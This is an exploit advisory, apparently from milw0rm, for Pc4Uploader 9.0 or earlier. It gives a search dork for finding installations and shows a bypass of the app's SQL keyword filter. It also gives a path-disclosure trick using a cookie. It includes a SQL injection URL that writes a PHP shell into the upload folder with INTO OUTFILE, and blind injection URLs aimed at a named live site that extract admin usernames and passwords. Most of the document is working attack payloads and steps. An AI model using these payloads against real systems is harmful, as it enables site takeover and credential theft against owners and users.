<html><head><title>Pc4Uploader 9.0 Remote Blind SQL Injection Vulnerability</title></head><pre>                  ||          ||   | ||        
           o_,_7 _||  . _o_7 _|| q_|_||  o_w_,
          ( :   /    (_)    /           (   .  


=By: 	Qabandi
=Email:	iqa[a]hotmail.fr

	From Kuwait PEACE

=Vuln:		pc4arb - pc4 Uploader &lt;= 9.0 Blind SQL injection
=INFO:		http://pc4arb.com/product-13.html
=BUY:  		http://pc4arb.com/deal-13.html
=DORK:		intext:&quot;Powered by Pc4Uploader  v9.0&quot;


@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-SQL-Filter-Bypass@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
----------Vulnerable code@ &quot;./code.php&quot;----------------------------------------
function filter_sql( $inputsql )
{
    $regsql = &quot;(delete)|(update)|(union)|(insert)&quot;;
    return eregi_replace( $regsql, &quot;&quot;, $inputsql );
}
------------------END----------------------------------------------------------
-=-===--=-=-==-=-==-=-=-=-=-=-=-=-POC-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
$Q = &quot;UNIunionON&quot;;
filter_sql($Q);
echo $Q;

--
Result = UNION

We can use this to upload a file, using the &quot;dumpfile&quot; and &quot;outfile&quot; Mysql functions.

POC:-

conditions: magic_quotes_gpc = off // 0777 chmoded folder // location of folder.

To get location in server, we can generate an error using the STYLE cookie handler, to do this we need to set tempst=qabandi.

javascript:document.cookie=&quot;tempst=qabandi&quot;;

Refresh,

you will get the following:

Warning: file(templates/Qabandi/main_block.html) [function.file]: failed to open stream: No such file or directory in /home/XXXXXXX/public_html/function.php on line 33

now we have the location in server, &quot;/home/XXXXXXX/public_html/&quot;

&quot;/home/XXXXXXX/public_html/upfiles/&quot; &lt;--- 99% of the time its chmoded 0777.

now the exploit:

http://localhost/pc4up/code.php?load=banner&amp;id=-1 UNunionION select 1,2,3,'&lt;? include($Q);?&gt;',5,6,7,8,9 into outfile '/home/XXXXXXX/public_html/upfiles/qabandi.php'


@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-BLIND SQL@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
----------Vulnerable code@ &quot;./code.php&quot;-----------------------------------------

if ( $_GET['load'] == &quot;banner&quot; )
{
    $idx = $_GET['id'];
    $idx = strip_tags( $idx );
    $idx = filter_sql( $idx );/// &lt;------ SIMPLY bypassed by using &quot;unUNIONion&quot; ;)
    if ( !( $query_banner = mysql_query( &quot;SELECT * FROM banners WHERE id={$idx}&quot; ) ) )
    {
        exit( &quot;Query failed&quot; );
    }
    $x = mysql_fetch_row( $query_banner );
    $url = $x[2];
    $visits = $x[5];
    if ( !( $query = mysql_query( &quot;UPDATE banners SET visits=visits+1 WHERE id ={$idx}&quot; ) ) )
    {
        exit( &quot;Query failed&quot; );
    }
    header( &quot;Location: {$url}&quot; );
}


--------------:PoC:-------------
conditions:		admin must have added a banner using the &quot;add banner&quot; feature. the banner ID must be valid.


Blind SQL DEMO:-
http://upload.traidnt.net/code.php?load=banner&amp;id=1 and substring(@@version,1,1)=4 &lt;-- TRUE!  (MySQL version 4)


http://upload.traidnt.net/code.php?load=banner&amp;id=1 and substring(@@version,1,1)=5 &lt;-- BLANK


To get info:

http://upload.traidnt.net/code.php?load=banner&amp;id=1 and ascii(substring((SELECT concat(username,char(62),password) from admin limit 0,1),1,1))&gt;95


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-=-=-=-==-=LA tsta3mloha 3la elmowaqi3 el islamiya=-=-=-=-=-=-=-=-
=-=-=-=-==-=-=-=-=-=-No-More---Private=-=-=-=-=-=-=-=-=-=-=-=-=-=-
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Salamz: Killer Hack, Mr.Mn7os, Ghost-r00t, All muslim hackers.

# milw0rm.com [2009-05-18]</pre></html>